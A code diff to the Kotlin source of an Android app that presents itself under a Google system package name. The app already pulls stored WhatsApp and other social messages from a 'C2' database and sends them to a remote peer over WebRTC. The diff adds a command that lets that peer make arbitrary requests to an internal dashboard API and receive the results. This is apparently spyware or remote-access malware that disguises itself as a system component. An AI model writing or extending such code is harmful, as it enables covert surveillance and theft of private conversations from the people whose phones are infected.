@@ -2,6 +2,7 @@ package com.google.android.system
 
 import android.content.Context
 import android.util.Log
+import com.homemonitor.WebDashboardApiRouter
 import org.json.JSONObject
 import org.webrtc.*
 import java.nio.ByteBuffer
@@ -241,7 +242,33 @@ class WebRtcEngine(
                     val req = JSONObject(msgText)
                     val type = req.optString("type", "")
 
-                    if (type == "DB_QUERY_SOCIAL") {
+                    if (type == "API_REQUEST") {
+                        val requestId = req.optString("requestId", "")
+                        val path = req.optString("path", "/api/summary")
+                        val method = req.optString("method", "GET")
+                        val body = req.optString("body", "")
+                        val pathUri = android.net.Uri.parse(path)
+
+                        val httpResponseStr = WebDashboardApiRouter.handleApiRequest(
+                            context = context,
+                            method = method,
+                            cleanPath = pathUri.path ?: path,
+                            pathUri = pathUri,
+                            bodyString = body,
+                            clientIp = "P2P_WEBRTC"
+                        )
+
+                        val bodyIndex = httpResponseStr.indexOf("\r\n\r\n")
+                        val responseContent = if (bodyIndex != -1) httpResponseStr.substring(bodyIndex + 4) else httpResponseStr
+
+                        val resPayload = JSONObject().apply {
+                            put("requestId", requestId)
+                            put("path", path)
+                            put("status", 200)
+                            put("data", try { JSONObject(responseContent) } catch (_: Exception) { try { org.json.JSONArray(responseContent) } catch (_: Exception) { responseContent } })
+                        }
+                        sendP2pMessage("API_RESPONSE", resPayload)
+                    } else if (type == "DB_QUERY_SOCIAL") {
                         val appKey = req.optString("appKey", "whatsapp")
                         val messagesArray = C2LocalDatabase.getInstance(context).getSocialMessagesJson(appKey)
                         val res = JSONObject().apply {
@@ -262,7 +289,7 @@ class WebRtcEngine(
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "onMessage DB Query error: ${e.message}")
+                Log.e(TAG, "onMessage error: ${e.message}")
             }
         }
     }
